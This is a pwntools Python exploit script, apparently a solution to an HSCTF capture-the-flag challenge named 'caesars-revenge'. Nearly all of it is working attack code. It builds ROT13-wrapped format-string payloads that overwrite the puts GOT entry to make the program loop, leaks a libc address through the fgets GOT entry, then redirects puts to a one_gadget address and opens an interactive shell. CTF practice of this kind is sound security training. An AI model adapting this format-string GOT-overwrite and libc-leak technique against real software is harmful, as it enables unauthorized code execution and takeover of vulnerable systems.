from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = '/challenge/caesars-revenge'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
    gdb.attach(sh)

if DEBUG:
    context.log_level = 'debug'

if len(argv) < 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    # Uncomment for debugging
    # if DEBUG:
    #     attach_gdb()

    REMOTE = False
else:
    sh = remote('pwn.hsctf.com', 4567)
    REMOTE = True

def shift(input_bytes, shift=13):
    output = b''
    for c in input_bytes:
        if c >= ord('A') and c <= ord('Z'):
            output += bytes([(shift + c - ord('A')) % 26 + ord('A')])
        elif c >= ord('a') and c <= ord('z'):
            output += bytes([(shift + c - ord('a')) % 26 + ord('a')])
        else:
            output += bytes([c])
    return output

def fmt_str(location, target, offset=0, padding=0x30):
    offset += padding // 8
    payload = f'%{((target >> (8*0)) & 0xffff)}x%{offset}$hn'
    payload += f'%{((0x10000 - ((target >> (8*0)) & 0xffff)) + ((target >> (8*2)) & 0xffff))}x%{offset + 1}$hn'
    payload += f'%{((0x10000 - ((target >> (8*2)) & 0xffff)) + ((target >> (8*4)) & 0xffff))}x%{offset + 2}$hn'
    payload += f'%{((0x10000 - ((target >> (8*4)) & 0xffff)) + ((target >> (8*6)) & 0xffff))}x%{offset + 3}$hn'
    payload = payload.encode()
    payload = payload.ljust(padding, b'a')
    payload += p64(location) + p64(location+2) + p64(location+4) + p64(location+6)
    return payload

send = lambda payload: [sh.sendlineafter(b': ', shift(payload)), sh.sendlineafter(b': ', b'13'), sh.recvuntil(b': ')]

puts_got = 0x0000000000404018
printf_got = 0x0000000000404038
fgets_got = 0x0000000000404040
caesar_addr = 0x401196

# make it loop
payload = fmt_str(puts_got, caesar_addr, 24, 0x40)
send(payload)

# leak libc_base
payload = b'%25$s'.ljust(8, b' ') + p64(fgets_got)
send(payload)

libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x06dad0
print('libc_base: ' + hex(libc_base))

# one_gadget and profit
win_addr = libc_base + 0x4526a
payload = fmt_str(puts_got, win_addr, 24, 0x40)
send(payload)
sh.interactive()

